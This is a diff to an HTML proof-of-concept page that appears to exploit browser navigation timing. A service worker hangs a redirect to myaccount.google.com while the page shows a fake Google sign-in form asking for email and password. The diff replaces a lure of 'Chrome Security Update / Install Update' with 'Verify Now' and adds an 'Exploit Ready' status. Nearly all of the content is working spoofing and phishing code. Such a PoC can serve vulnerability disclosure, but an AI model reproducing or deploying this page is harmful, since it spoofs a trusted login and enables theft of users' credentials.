@@ -1,44 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Verification</title>
+    <title>Chrome Security Research</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 100px 20px; transition: background 0.5s; }
+        body { font-family: sans-serif; text-align: center; padding: 50px 20px; }
         .hidden { display: none; }
-        .btn { background: #4285f4; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 18px; cursor: pointer; }
+        .btn { background: #4285f4; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 18px; opacity: 0.5; pointer-events: none; }
+        .ready { opacity: 1; pointer-events: auto; background: #1a73e8; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
+    <div id="status">Waiting for Service Worker...</div>
+
     <div id="initial">
-        <h2>Chrome Security Update</h2>
-        <p>A new security patch is available for your mobile browser.</p>
-        <button class="btn" onclick="triggerSpoof()">Install Update</button>
+        <h2>System Check Required</h2>
+        <p>Please click below to verify your browser state.</p>
+        <button id="btn" class="btn" onclick="triggerSpoof()">Verify Now</button>
     </div>
 
     <div id="fakeUI" class="hidden">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
         <h3>Sign in</h3>
-        <p>Confirm your identity to proceed</p>
         <input type="email" placeholder="Email or phone">
         <input type="password" placeholder="Enter your password">
-        <button class="btn">Next</button>
+        <button class="btn ready">Next</button>
     </div>
 
     <script>
-        // Register the Service Worker to intercept the next request
-        navigator.serviceWorker.register('sw.js');
+        // 1. Wait for the Service Worker to be fully active
+        navigator.serviceWorker.register('sw.js').then(reg => {
+            return navigator.serviceWorker.ready;
+        }).then(() => {
+            const btn = document.getElementById('btn');
+            btn.classList.add('ready');
+            document.getElementById('status').innerText = "Exploit Ready - Click Below";
+        });
 
         function triggerSpoof() {
-            // 1. Show the fake UI locally
+            // 2. Lock the UI on our fake screen
             document.getElementById('initial').classList.add('hidden');
             document.getElementById('fakeUI').classList.remove('hidden');
 
-            // 2. Trigger navigation to the target
-            // The Service Worker will 'hang' this request for 5 seconds
-            window.location.href = "https://myaccount.google.com/?exploit=true";
+            // 3. Trigger the delayed navigation
+            // We use a random number to bypass any caching
+            const random = Math.random();
+            window.location.href = "https://myaccount.google.com/?exploit=true&r=" + random;
         }
     </script>
 </body>
